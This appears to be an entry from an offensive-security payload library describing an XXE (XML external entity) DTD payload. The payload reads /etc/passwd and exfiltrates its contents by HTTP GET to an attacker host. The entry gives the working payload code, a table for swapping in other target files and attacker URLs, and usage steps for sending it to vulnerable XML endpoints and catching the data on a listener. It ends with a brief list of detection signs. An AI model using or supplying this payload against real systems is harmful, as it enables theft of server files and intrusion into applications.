---
id: 005a3896-1b99-4a0e-86ee-b3b3d1d98fa5
name: XXE-DTD-File-Exfiltration-Payload
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:44.656888+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - xxe
  - payload
  - exfiltration
validated: true
---

# XXE-DTD-File-Exfiltration-Payload

## Code

```xml
<!-- Load the contents of a sensitive file into a variable -->
<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!-- Use that variable to construct an HTTP get request with the file contents in the URL -->
<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://my.evil-host.com/x=%payload;">'>
%param1;
%external;
```

## Description

This XML DTD payload exploits XXE by defining parameter entities to read a local file (e.g., /etc/passwd) and exfiltrate its contents via an HTTP GET request to an attacker-controlled server. It's designed for injection into XML inputs where external entity processing is enabled, allowing blind file disclosure without altering the application's response.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| file:///etc/passwd | Path to the target file on the server | file:///C:/Windows/win.ini (for Windows) |
| http://my.evil-host.com | Attacker's HTTP server URL for receiving data | http://attacker-ip.com |
| x=%payload | Query parameter name holding the file contents | Can be customized (e.g., data=%payload) |

## Usage

Embed this DTD within a full XML document (e.g., <!DOCTYPE root [ %payload; ]><root></root>) and send via POST to a vulnerable XML endpoint. Start an HTTP listener on the attacker server first (e.g., python -m http.server). Ideal for web apps, APIs, or services parsing user-supplied XML. Test on local setups like vulnerable XXE labs before production use.

## Detection

- XML parser logs showing entity expansion or external entity resolution attempts.
- Outbound HTTP requests from the application server to unexpected domains/IPs.
- WAF alerts for DTD injection or entity references in XML payloads.
- File access logs indicating reads of sensitive paths like /etc/passwd.

## Related

- [[procedures/Exploit-XXE-in-DTD-to-Exfiltrate-File-Contents]]
- [[commands/curl-send-xxe-payload]]
